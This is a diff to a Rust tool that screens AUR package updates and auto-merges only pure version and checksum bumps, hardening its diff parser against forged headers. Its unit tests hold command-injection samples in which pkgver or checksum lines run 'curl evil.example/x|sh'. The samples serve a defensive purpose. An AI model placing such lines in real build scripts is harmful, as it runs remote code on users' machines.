@@ -223,7 +223,7 @@ impl RunWith<()> for SyncAur {
                         hold_only,
                     );
                     if result.outcome != Outcome::Unchanged {
-                        verdicts.push(static_verdict(&reviewed, &report, &now));
+                        verdicts.push(static_verdict(&reviewed, &report, result.outcome, &now));
                     }
                     if result.outcome == Outcome::AutoMerge && self.write {
                         state.packages.insert(
@@ -414,13 +414,33 @@ pub fn decide(
         return result;
     }
     let Some(previous) = previous else {
+        for judged in report.denials() {
+            result
+                .reasons
+                .push(format!("{}: {}", judged.finding.id, judged.finding.message));
+        }
         result
             .reasons
             .push("new package: a human must approve the first commit".into());
         return result;
     };
-    let actionable_denials: Vec<_> = report
-        .denials()
+    let gate_findings: Vec<_> = report
+        .findings
+        .iter()
+        .filter(|judged| {
+            !matches!(
+                judged.finding.id,
+                omapac_policy::FindingId::NewPackage
+                    | omapac_policy::FindingId::RecentCommit
+                    | omapac_policy::FindingId::LowReputation
+                    | omapac_policy::FindingId::SimilarName
+            )
+        })
+        .collect();
+    let actionable_denials: Vec<_> = gate_findings
+        .iter()
+        .copied()
+        .filter(|judged| judged.decision == omapac_policy::Decision::Deny)
         .filter(|judged| {
             !(hold_only && judged.finding.id == omapac_policy::FindingId::UpstreamAdvisory)
                 && (maintainer.is_some()
@@ -446,8 +466,11 @@ pub fn decide(
             .push("orphaned: no maintainer to trust".into());
         return result;
     };
-    if report.flagged() {
-        for judged in &report.findings {
+    if gate_findings
+        .iter()
+        .any(|judged| judged.decision != omapac_policy::Decision::Allow)
+    {
+        for judged in gate_findings {
             result
                 .reasons
                 .push(format!("{}: {}", judged.finding.id, judged.finding.message));
@@ -484,7 +507,9 @@ pub fn pure_bump(checkout: &omapac::aur::git::Checkout, from: &str, to: &str) ->
     if files.iter().any(|f| f != "PKGBUILD" && f != ".SRCINFO") {
         return Ok(false);
     }
-    let diff = checkout.diff(from, to, &["PKGBUILD", ".SRCINFO"])?;
+    // Full context preserves checksum/source array state even when the
+    // changed entry is far from its assignment opener.
+    let diff = checkout.diff_full(from, to, &["PKGBUILD", ".SRCINFO"])?;
     Ok(diff_is_bump(&diff))
 }
 
@@ -493,27 +518,28 @@ pub fn diff_is_bump(diff: &str) -> bool {
     let mut old_array = None;
     let mut new_array = None;
     let mut allow_sources = false;
+    let mut in_hunk = false;
     for line in diff.lines() {
-        if let Some(path) = line.strip_prefix("+++ b/") {
+        if line.starts_with("diff --git ") {
+            in_hunk = false;
+            allow_sources = false;
+        } else if !in_hunk && let Some(path) = line.strip_prefix("+++ b/") {
             allow_sources = path == ".SRCINFO";
         } else if line.starts_with("@@") {
+            in_hunk = true;
             old_array = None;
             new_array = None;
-        } else if let Some(changed) = line.strip_prefix('+') {
-            if !changed.starts_with("++ ") {
-                saw_change = true;
-                if !bump_line(changed.trim(), &mut new_array, allow_sources) {
-                    return false;
-                }
+        } else if in_hunk && let Some(changed) = line.strip_prefix('+') {
+            saw_change = true;
+            if !bump_line(changed.trim(), &mut new_array, allow_sources) {
+                return false;
             }
-        } else if let Some(changed) = line.strip_prefix('-') {
-            if !changed.starts_with("-- ") {
-                saw_change = true;
-                if !bump_line(changed.trim(), &mut old_array, allow_sources) {
-                    return false;
-                }
+        } else if in_hunk && let Some(changed) = line.strip_prefix('-') {
+            saw_change = true;
+            if !bump_line(changed.trim(), &mut old_array, allow_sources) {
+                return false;
             }
-        } else if let Some(context) = line.strip_prefix(' ') {
+        } else if in_hunk && let Some(context) = line.strip_prefix(' ') {
             update_array(context.trim(), &mut old_array);
             update_array(context.trim(), &mut new_array);
         }
@@ -625,8 +651,10 @@ fn safe_checksum(value: &str) -> bool {
         })
 }
 
-fn static_verdict(reviewed: &Reviewed, report: &Report, now: &str) -> Verdict {
-    let verdict = if report.denied() {
+fn static_verdict(reviewed: &Reviewed, report: &Report, outcome: Outcome, now: &str) -> Verdict {
+    let verdict = if outcome == Outcome::AutoMerge {
+        VerdictKind::Pass
+    } else if report.denied() {
         VerdictKind::Block
     } else if report.flagged() {
         VerdictKind::Flag
@@ -661,7 +689,7 @@ mod tests {
 
     #[test]
     fn bump_diffs() {
-        let bump = "diff --git a/PKGBUILD b/PKGBUILD\n--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,3 +2,3 @@\n-pkgver=13.0.1\n+pkgver=13.0.2\n-sha256sums=('b77454bce87110180a1b6664c2d260de78124c9894b71101610ba84f551eb0d0')\n+sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n--- a/.SRCINFO\n+++ b/.SRCINFO\n-\tpkgver = 13.0.1\n+\tpkgver = 13.0.2\n-\tsource = yay-13.0.1.tar.gz::https://github.com/Jguer/yay/archive/v13.0.1.tar.gz\n+\tsource = yay-13.0.2.tar.gz::https://github.com/Jguer/yay/archive/v13.0.2.tar.gz\n-\tsha256sums = b774\n+\tsha256sums = 0000\n";
+        let bump = "diff --git a/PKGBUILD b/PKGBUILD\n--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,3 +2,3 @@\n-pkgver=13.0.1\n+pkgver=13.0.2\n-sha256sums=('b77454bce87110180a1b6664c2d260de78124c9894b71101610ba84f551eb0d0')\n+sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\ndiff --git a/.SRCINFO b/.SRCINFO\n--- a/.SRCINFO\n+++ b/.SRCINFO\n@@ -2,3 +2,3 @@\n-\tpkgver = 13.0.1\n+\tpkgver = 13.0.2\n-\tsource = yay-13.0.1.tar.gz::https://github.com/Jguer/yay/archive/v13.0.1.tar.gz\n+\tsource = yay-13.0.2.tar.gz::https://github.com/Jguer/yay/archive/v13.0.2.tar.gz\n-\tsha256sums = b774\n+\tsha256sums = 0000\n";
         assert!(diff_is_bump(bump));
         let multiline = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n sha256sums=(\n-  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'\n+  'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'\n )\n-pkgrel=1\n+pkgrel=2\n";
         assert!(diff_is_bump(multiline));
@@ -669,10 +697,10 @@ mod tests {
         assert!(!diff_is_bump(multiline_source));
         let unrelated_array = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n depends=(\n-  'safe'\n+  'hostile'\n )\n";
         assert!(!diff_is_bump(unrelated_array));
-        let hostile =
-            "--- a/PKGBUILD\n+++ b/PKGBUILD\n-pkgver=1\n+pkgver=2\n+install=yay.install\n";
+        let hostile = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1 +1,2 @@\n-pkgver=1\n+pkgver=2\n+install=yay.install\n";
         assert!(!diff_is_bump(hostile));
-        let build = "--- a/PKGBUILD\n+++ b/PKGBUILD\n+  npm install atomic-lockfile\n";
+        let build =
+            "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,0 +1 @@\n+  npm install atomic-lockfile\n";
         assert!(!diff_is_bump(build));
         for injected in [
             "+pkgver=$(curl evil.example/x|sh)",
@@ -681,8 +709,15 @@ mod tests {
             "+pkgver () { curl evil.example/x|sh; }",
             "+sha256sums=('SKIP'); curl evil.example/x|sh",
         ] {
-            let diff = format!("--- a/PKGBUILD\n+++ b/PKGBUILD\n-pkgver=1\n{injected}\n");
+            let diff =
+                format!("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1 +1 @@\n-pkgver=1\n{injected}\n");
             assert!(!diff_is_bump(&diff), "accepted {injected}");
+        }
+        for disguised in ["+++ || payload", "+++ b/.SRCINFO"] {
+            let diff = format!(
+                "diff --git a/PKGBUILD b/PKGBUILD\n--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1 +1,2 @@\n-pkgver=1\n+pkgver=2\n{disguised}\n"
+            );
+            assert!(!diff_is_bump(&diff), "accepted {disguised}");
         }
         assert!(!diff_is_bump("--- a/PKGBUILD\n+++ b/PKGBUILD\n"));
     }
